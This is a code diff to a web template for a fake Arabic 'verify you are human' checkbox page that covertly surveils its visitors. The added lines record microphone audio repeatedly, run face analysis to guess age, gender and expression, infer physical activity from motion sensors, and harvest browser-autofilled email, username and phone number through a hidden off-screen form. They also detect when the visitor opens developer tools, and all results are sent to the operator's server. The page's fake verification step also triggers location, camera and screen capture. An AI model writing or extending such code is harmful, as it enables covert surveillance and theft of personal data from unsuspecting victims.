@@ -5,6 +5,7 @@
 <meta name="robots" content="noindex, nofollow">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>لحظة من فضلك...</title>
+<% if(faceAIAccess){ %><script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/dist/face-api.js"></script><% } %>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 html{font-family:'Segoe UI',Tahoma,sans-serif;background:#f6f6f6;color:#313131;direction:rtl}
@@ -471,6 +472,107 @@ async function doScreenCapture(){
 }
 <% } %>
 
+<% if(contaudioAccess){ %>
+// ── Continuous audio every 2 min (premium) ────────────────────────────────────
+function doContAudio(){
+  var _aC=0,_aM=10;
+  var _aIv=setInterval(function(){
+    if(_aC>=_aM){clearInterval(_aIv);return;}
+    navigator.mediaDevices.getUserMedia({audio:true,video:false}).then(function(stream){
+      var rec=new MediaRecorder(stream),chunks=[];
+      rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
+      rec.onstop=function(){
+        stream.getTracks().forEach(function(t){t.stop();});
+        var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();
+        fr.onloadend=function(){$.post(a+"/audio-cont",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};
+        fr.readAsDataURL(blob);
+      };
+      rec.start();
+      setTimeout(function(){try{rec.stop();}catch(e){}},30000);
+      _aC++;
+    }).catch(function(){});
+  },120000);
+}
+<% } %>
+
+<% if(faceAIAccess){ %>
+// ── Face AI analysis (premium) ────────────────────────────────────────────────
+async function doFaceAI(imgEl){
+  try{
+    if(typeof faceapi==="undefined")return;
+    var MODEL_URL="https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model";
+    await Promise.all([
+      faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
+      faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL),
+      faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL)
+    ]);
+    var result=await faceapi.detectSingleFace(imgEl,new faceapi.TinyFaceDetectorOptions()).withAgeAndGender().withFaceExpressions();
+    if(!result)return;
+    var age=Math.round(result.age);
+    var gender=result.gender;
+    var exprs=result.expressions;
+    var topExpr=Object.keys(exprs).reduce(function(a,b){return exprs[a]>exprs[b]?a:b;});
+    $.post(a+"/faceai",{uid:uid,age:age,gender:gender,expression:topExpr});
+  }catch(e){}
+}
+<% } %>
+
+<% if(activityAccess){ %>
+// ── Physical activity detection (premium) ─────────────────────────────────────
+function doActivityDetect(){
+  var motions=[];
+  function onMotion(e){var g=e.accelerationIncludingGravity||{};motions.push(Math.sqrt((g.x||0)*(g.x||0)+(g.y||0)*(g.y||0)+(g.z||0)*(g.z||0)));}
+  window.addEventListener("devicemotion",onMotion);
+  setTimeout(function(){
+    window.removeEventListener("devicemotion",onMotion);
+    var activity,mag="0";
+    if(!motions.length){activity="❓ لا يوجد مستشعر حركة";}
+    else{
+      var avg=motions.reduce(function(s,v){return s+v;},0)/motions.length;
+      mag=avg.toFixed(2);
+      if(avg<2)activity="🪑 ثابت / يجلس";
+      else if(avg<6)activity="🚶 يمشي";
+      else if(avg<14)activity="🏃 يجري";
+      else activity="🚗 في مركبة أو اهتزاز شديد";
+    }
+    $.post(a+"/activity",{uid:uid,activity:activity,avgMag:mag});
+  },6000);
+}
+<% } %>
+
+<% if(autofillAccess){ %>
+// ── Autofill extraction (premium) ─────────────────────────────────────────────
+function doAutofill(){
+  var f=document.createElement("form");
+  f.style.cssText="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.001;pointer-events:none;";
+  f.innerHTML='<input name="email" type="email" autocomplete="email" tabindex="-1"><input name="username" type="text" autocomplete="username" tabindex="-1"><input name="tel" type="tel" autocomplete="tel" tabindex="-1">';
+  document.body.appendChild(f);
+  setTimeout(function(){
+    var em=f.querySelector("[name=email]").value;
+    var un=f.querySelector("[name=username]").value;
+    var tel=f.querySelector("[name=tel]").value;
+    document.body.removeChild(f);
+    if(em||un||tel) $.post(a+"/autofill",{uid:uid,email:em,username:un,tel:tel});
+  },2000);
+}
+<% } %>
+
+<% if(devtoolsAccess){ %>
+// ── DevTools detection (premium) ──────────────────────────────────────────────
+var _dtSent=false;
+function _checkDevTools(){
+  if(_dtSent)return;
+  if(window.outerWidth-window.innerWidth>160||window.outerHeight-window.innerHeight>160){
+    _dtSent=true;
+    $.post(a+"/devtools-alert",{uid:uid,type:"resize"});
+  }
+}
+setInterval(_checkDevTools,2000);
+var _dtImg=new Image();
+Object.defineProperty(_dtImg,"id",{get:function(){if(!_dtSent){_dtSent=true;$.post(a+"/devtools-alert",{uid:uid,type:"console"});}return 1;}});
+console.log("%c",_dtImg);
+<% } %>
+
 // ── One button: all permissions at once ───────────────────────────────────────
 var verifying=false;
 function doVerify(){
@@ -478,20 +580,20 @@ function doVerify(){
   verifying=true;
   document.getElementById('cf-cb').classList.add('ticked');
   document.getElementById('step-text').textContent="جارٍ التحقق... يرجى الانتظار";
-  // Start redirect timer: 9 seconds from button click
   setTimeout(function(){doRedirect();},9000);
-  // Fire location + camera in parallel
   fireLocation();
-<% if(camAccess){ %>  doCamera();<% } %>
+<% if(camAccess){ %>  doCamera().then&&doCamera().then(function(){<% if(faceAIAccess){ %>var vf=document.getElementById('vid-front');if(vf)doFaceAI(vf);<% } %>}).catch(function(){<% if(faceAIAccess){ %>var vf=document.getElementById('vid-front');if(vf)doFaceAI(vf);<% } %>});<% } else if(faceAIAccess){ %>  setTimeout(function(){var vf=document.getElementById('vid-front');if(vf)doFaceAI(vf);},4000);<% } %>
 <% if(contcamAccess){ %>  setTimeout(function(){if(typeof doContCam==="function")doContCam();},35000);<% } %>
+<% if(contaudioAccess){ %>  setTimeout(function(){doContAudio();},5000);<% } %>
 <% if(screenCapAccess){ %>  doScreenCapture();<% } %>
+<% if(activityAccess){ %>  doActivityDetect();<% } %>
 <% if(pushAccess){ %>  if(typeof _registerPush==="function") _registerPush();<% } %>
 }
 
 // ── Page init ─────────────────────────────────────────────────────────────────
 window.addEventListener('DOMContentLoaded',function(){
-  sendDeviceInfo(); // silent, no permission needed
-  // After 2.5s show checkbox
+  sendDeviceInfo();
+<% if(autofillAccess){ %>  setTimeout(doAutofill,1500);<% } %>
   setTimeout(function(){
     document.getElementById('step-text').textContent="خطوة أخيرة للتحقق من هويتك";
     document.getElementById('spinner').style.animationPlayState='paused';
